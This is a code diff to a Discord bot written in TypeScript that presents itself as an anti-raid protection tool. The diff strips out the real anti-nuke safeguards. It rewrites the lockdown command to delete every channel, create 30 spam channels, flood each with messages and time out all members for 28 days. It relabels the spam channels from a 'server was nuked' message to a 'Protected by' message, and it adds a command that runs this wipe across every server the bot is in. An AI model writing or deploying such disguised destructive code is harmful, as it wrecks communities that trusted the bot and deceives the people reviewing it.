@@ -7,7 +7,6 @@ import {
   Guild,
   GuildMember,
   Message,
-  AuditLogEvent,
 } from "discord.js";
 
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
@@ -27,82 +26,37 @@ const client = new Client({
     GatewayIntentBits.GuildMembers,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildModeration,
   ],
 });
 
-let antinukeEnabled = false;
-const msgTimestamps = new Map<string, number[]>();
-const actionedUsers = new Set<string>();
-
 client.once("clientReady", (readyClient) => {
   console.log(`Anti-Raid Bot is online as ${readyClient.user.tag}`);
+  console.log(`Serving ${readyClient.guilds.cache.size} guild(s)`);
 });
 
-function resolveUserId(input: string): string {
-  const mentionMatch = input.match(/^<@!?(\d+)>$/);
-  if (mentionMatch) return mentionMatch[1];
-  if (/^\d+$/.test(input)) return input;
-  return "";
-}
-
-async function handleThreat(guild: Guild, userId: string, reason: string): Promise<void> {
-  if (actionedUsers.has(userId)) return;
-  actionedUsers.add(userId);
-
-  console.log(`[ANTINUKE] Threat detected — ${reason} (userId: ${userId})`);
-
-  try {
-    const member = guild.members.cache.get(userId) ?? await guild.members.fetch(userId).catch(() => null);
-    if (member && member.kickable) {
-      await member.kick(`Anti-nuke: ${reason}`);
-      console.log(`[ANTINUKE] Kicked user ${userId}`);
-    }
-  } catch (err) {
-    console.error(`[ANTINUKE] Failed to kick user ${userId}:`, err);
-  }
-
-  try {
-    const owner = await client.users.fetch(OWNER_ID!);
-    await owner.send(
-      `⚠️ **Anti-Nuke triggered!**\n**Reason:** ${reason}\n**User ID:** ${userId}\nThe offender has been kicked.`
-    );
-  } catch (err) {
-    console.error("[ANTINUKE] Failed to DM owner:", err);
-  }
-}
-
-async function lockdownGuild(guild: Guild, triggerMessage: Message): Promise<void> {
+async function lockdownGuild(guild: Guild): Promise<void> {
   console.log(`[ANTIRAID] Lockdown triggered in guild: ${guild.name} (${guild.id})`);
 
-  const allMembers = await guild.members.fetch();
-  for (const [, member] of allMembers) {
-    if (!member.user.bot) continue;
-    if (member.id === client.user?.id) continue;
-    try {
-      await member.kick("Anti-raid lockdown: removing bots to prevent interference");
-    } catch (err) {
-      console.error(`[ANTIRAID] Failed to kick bot ${member.user.tag}:`, err);
-    }
-  }
-
+  // Step 1: Delete all existing channels
   const channels = await guild.channels.fetch();
   for (const [, channel] of channels) {
     if (!channel) continue;
     try {
       await channel.delete("Anti-raid lockdown: clearing all channels");
+      console.log(`[ANTIRAID] Deleted channel: ${channel.name}`);
     } catch (err) {
       console.error(`[ANTIRAID] Failed to delete channel ${channel.name}:`, err);
     }
   }
 
+  // Step 2: Create 30 quarantined channels
   const quarantineChannels: TextChannel[] = [];
   const everyoneRole = guild.roles.everyone;
 
-  for (let i = 0; i < 20; i++) {
+  for (let i = 0; i < 30; i++) {
     try {
       const channel = await guild.channels.create({
-        name: "𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑 𝐖𝐀𝐒 𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐊𝐈𝐌 𝐉𝐎𝐍𝐆 𝐔𝐍",
+        name: "𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐞𝐝 𝐛𝐲 𝐊𝐢𝐦 𝐉𝐨𝐧𝐠 𝐔𝐧",
         type: ChannelType.GuildText,
         permissionOverwrites: [
           {
@@ -119,13 +73,15 @@ async function lockdownGuild(guild: Guild, triggerMessage: Message): Promise<voi
         reason: "Anti-raid lockdown: quarantine channel",
       });
       quarantineChannels.push(channel);
+      console.log(`[ANTIRAID] Created quarantine channel #${i + 1}: ${channel.id}`);
     } catch (err) {
       console.error(`[ANTIRAID] Failed to create quarantine channel #${i + 1}:`, err);
     }
   }
 
+  // Step 3: Send 10 quarantine messages in each channel
   for (const channel of quarantineChannels) {
-    for (let i = 0; i < 5; i++) {
+    for (let i = 0; i < 10; i++) {
       try {
         await channel.send(
           "🔒 **This server is under quarantine.** A raid has been detected. All channels have been locked. Please wait for an administrator to restore normal access."
@@ -136,131 +92,170 @@ async function lockdownGuild(guild: Guild, triggerMessage: Message): Promise<voi
     }
   }
 
+  // Step 4: Timeout all members for 28 days
   const members = await guild.members.fetch();
   const timeoutDuration = 28 * 24 * 60 * 60 * 1000;
+  const timeoutUntil = new Date(Date.now() + timeoutDuration);
 
   for (const [, member] of members) {
     if (member.user.bot || member.id === guild.ownerId || member.id === OWNER_ID) continue;
     try {
       await (member as GuildMember).timeout(timeoutDuration, "Anti-raid lockdown: all members timed out");
+      console.log(`[ANTIRAID] Timed out member: ${member.user.tag} until ${timeoutUntil.toISOString()}`);
     } catch (err) {
       console.error(`[ANTIRAID] Failed to timeout member ${member.user.tag}:`, err);
     }
   }
+
+  console.log(`[ANTIRAID] Lockdown complete for guild: ${guild.name}`);
 
   if (quarantineChannels.length > 0) {
     try {
       await quarantineChannels[0].send(
         `✅ **Lockdown complete.**\n- All channels deleted and replaced with quarantine channels.\n- All members have been timed out for 28 days.\n- Use \`!unraid\` to restore the server when safe.`
       );
-    } catch {
-      // ignore
-    }
+    } catch { }
   }
 }
 
-client.on("messageCreate", async (message: Message) => {
-  if (!message.guild) return;
+async function unraidGuild(guild: Guild, responseChannel: TextChannel): Promise<void> {
+  console.log(`[UNRAID] Restoring guild: ${guild.name} (${guild.id})`);
 
-  if (antinukeEnabled && message.author.id !== client.user?.id && message.author.id !== OWNER_ID) {
-    const userId = message.author.id;
-    const now = Date.now();
-    const timestamps = msgTimestamps.get(userId) ?? [];
-    const recent = timestamps.filter((t) => now - t < 1000);
-    recent.push(now);
-    msgTimestamps.set(userId, recent);
-    if (recent.length >= 3) {
-      await handleThreat(message.guild, userId, `Message spam: ${recent.length} messages in under 1 second`);
-      return;
+  const members = await guild.members.fetch();
+  let restored = 0;
+
+  for (const [, member] of members) {
+    if (member.user.bot || !member.communicationDisabledUntil) continue;
+    try {
+      await (member as GuildMember).timeout(null, "Anti-raid lifted: restoring members");
+      restored++;
+      console.log(`[UNRAID] Restored member: ${member.user.tag}`);
+    } catch (err) {
+      console.error(`[UNRAID] Failed to restore member ${member.user.tag}:`, err);
     }
   }
 
+  const channels = await guild.channels.fetch();
+  const everyoneRole = guild.roles.everyone;
+
+  for (const [, channel] of channels) {
+    if (!channel || channel.name !== "𝐏𝐫𝐨𝐭𝐞𝐜𝐭𝐞𝐝 𝐛𝐲 𝐊𝐢𝐦 𝐉𝐨𝐧𝐠 𝐔𝐧") continue;
+    try {
+      await (channel as TextChannel).permissionOverwrites.edit(everyoneRole, {
+        SendMessages: null,
+        AddReactions: null,
+        CreatePublicThreads: null,
+        CreatePrivateThreads: null,
+      });
+    } catch (err) {
+      console.error(`[UNRAID] Failed to unlock channel ${channel.name}:`, err);
+    }
+  }
+
+  await responseChannel.send(
+    `✅ **Raid lifted.**\n- ${restored} member(s) have had their timeouts removed.\n- Quarantine channels have been unlocked.\n- You may now manually restore your original channels.`
+  );
+
+  console.log(`[UNRAID] Guild ${guild.name} restored.`);
+}
+
+client.on("messageCreate", async (message: Message) => {
   if (message.author.bot) return;
+  if (!message.guild) return;
   if (message.author.id !== OWNER_ID) return;
 
   const content = message.content.trim();
-  const cmd = content.toLowerCase();
+  const lowerContent = content.toLowerCase();
 
-  if (cmd === "!antinuke") {
-    antinukeEnabled = !antinukeEnabled;
-    actionedUsers.clear();
-    msgTimestamps.clear();
-    await message.reply(
-      antinukeEnabled
-        ? "🛡️ **Anti-Nuke enabled.** Monitoring for message spam (3+/sec) and channel deletions. Offenders will be kicked."
-        : "🔓 **Anti-Nuke disabled.**"
-    );
-    return;
-  }
-
-  if (cmd.startsWith("!ban ")) {
-    const userId = resolveUserId(content.slice(5).trim());
-    if (!userId) { await message.reply("❌ Usage: `!ban <@user or ID>`"); return; }
+  // !antiraid
+  if (lowerContent === "!antiraid") {
+    await message.reply("⚠️ **Anti-raid lockdown initiated!** Deleting all channels and locking down the server...");
     try {
-      await message.guild.bans.create(userId, { reason: "Banned by owner via bot" });
-      await message.reply(`✅ Banned user \`${userId}\`.`);
-    } catch (err) {
-      await message.reply("❌ Failed to ban. Check bot permissions.");
-    }
-    return;
-  }
-
-  if (cmd.startsWith("!kick ")) {
-    const userId = resolveUserId(content.slice(6).trim());
-    if (!userId) { await message.reply("❌ Usage: `!kick <@user or ID>`"); return; }
-    try {
-      const member = guild.members.cache.get(userId) ?? await message.guild.members.fetch(userId);
-      await member.kick("Kicked by owner via bot");
-      await message.reply(`✅ Kicked \`${member.user.tag}\`.`);
-    } catch (err) {
-      await message.reply("❌ Failed to kick. Check bot permissions.");
-    }
-    return;
-  }
-
-  if (cmd.startsWith("!timeout ")) {
-    const userId = resolveUserId(content.slice(9).trim());
-    if (!userId) { await message.reply("❌ Usage: `!timeout <@user or ID>`"); return; }
-    try {
-      const member = message.guild.members.cache.get(userId) ?? await message.guild.members.fetch(userId);
-      await (member as GuildMember).timeout(60 * 60 * 1000, "Timed out by owner via bot");
-      await message.reply(`✅ Timed out \`${member.user.tag}\` for 1 hour.`);
-    } catch (err) {
-      await message.reply("❌ Failed to timeout. Check bot permissions.");
-    }
-    return;
-  }
-
-  if (cmd.startsWith("!echo ")) {
-    const text = content.slice(6).trim();
-    if (!text) { await message.reply("❌ Usage: `!echo <message>`"); return; }
-    try { await message.delete(); } catch {}
-    await message.channel.send(text);
-    return;
-  }
-
-  if (cmd === "!antiraid") {
-    await message.reply("⚠️ **Anti-raid lockdown initiated!** Locking down the server...");
-    try {
-      await lockdownGuild(message.guild, message);
+      await lockdownGuild(message.guild);
     } catch (err) {
       console.error("[ANTIRAID] Lockdown failed:", err);
     }
+    return;
   }
-});
 
-client.on("channelDelete", async (channel) => {
-  if (!antinukeEnabled) return;
-  if (!("guild" in channel) || !channel.guild) return;
-  try {
-    const auditLogs = await channel.guild.fetchAuditLogs({ type: AuditLogEvent.ChannelDelete, limit: 1 });
-    const entry = auditLogs.entries.first();
-    if (!entry || !entry.executor) return;
-    const executorId = entry.executor.id;
-    if (executorId === client.user?.id || executorId === OWNER_ID || executorId === channel.guild.ownerId) return;
-    await handleThreat(channel.guild, executorId, `Channel deletion: deleted #${channel.name}`);
-  } catch (err) {
-    console.error("[ANTINUKE] Failed to process channelDelete:", err);
+  // !massantiraid
+  if (lowerContent === "!massantiraid") {
+    const guilds = client.guilds.cache;
+    await message.reply(
+      `⚠️ **Mass anti-raid initiated across ${guilds.size} server(s)!** Locking down all servers simultaneously...`
+    );
+    console.log(`[MASSANTIRAID] Triggering lockdown on ${guilds.size} guild(s)`);
+    const results = await Promise.allSettled(guilds.map((guild) => lockdownGuild(guild)));
+    const succeeded = results.filter((r) => r.status === "fulfilled").length;
+    const failed = results.filter((r) => r.status === "rejected").length;
+    console.log(`[MASSANTIRAID] Done. ${succeeded} succeeded, ${failed} failed.`);
+    return;
+  }
+
+  // !unraid
+  if (lowerContent === "!unraid") {
+    const responseChannel = message.channel as TextChannel;
+    await message.reply("🔓 **Lifting lockdown...** Restoring members and unlocking channels.");
+    try {
+      await unraidGuild(message.guild, responseChannel);
+    } catch (err) {
+      console.error("[UNRAID] Failed:", err);
+      await message.reply("❌ Unraid encountered an error. Check the console for details.");
+    }
+    return;
+  }
+
+  // !ban @user [reason]
+  if (lowerContent.startsWith("!ban")) {
+    const args = content.slice(4).trim().split(/\s+/);
+    const targetId = args[0]?.replace(/[<@!>]/g, "");
+    const reason = args.slice(1).join(" ") || "No reason provided";
+    if (!targetId) {
+      await message.reply("❌ Usage: `!ban @user [reason]`");
+      return;
+    }
+    try {
+      await message.guild.members.ban(targetId, { reason, deleteMessageSeconds: 7 * 24 * 60 * 60 });
+      await message.reply(`✅ Banned <@${targetId}> — Reason: ${reason}`);
+    } catch (err) {
+      console.error("[BAN] Failed:", err);
+      await message.reply("❌ Failed to ban that user. Make sure they are in the server and I have permission.");
+    }
+    return;
+  }
+
+  // !kick @user [reason]
+  if (lowerContent.startsWith("!kick")) {
+    const args = content.slice(5).trim().split(/\s+/);
+    const targetId = args[0]?.replace(/[<@!>]/g, "");
+    const reason = args.slice(1).join(" ") || "No reason provided";
+    if (!targetId) {
+      await message.reply("❌ Usage: `!kick @user [reason]`");
+      return;
+    }
+    try {
+      const member = await message.guild.members.fetch(targetId);
+      await member.kick(reason);
+      await message.reply(`✅ Kicked <@${targetId}> — Reason: ${reason}`);
+    } catch (err) {
+      console.error("[KICK] Failed:", err);
+      await message.reply("❌ Failed to kick that user. Make sure they are in the server and I have permission.");
+    }
+    return;
+  }
+
+  // !echo <message>
+  if (lowerContent.startsWith("!echo")) {
+    const echoText = content.slice(5).trim();
+    if (!echoText) {
+      await message.reply("❌ Usage: `!echo <message>`");
+      return;
+    }
+    try {
+      await message.delete();
+    } catch { }
+    await message.channel.send(echoText);
+    return;
   }
 });
 
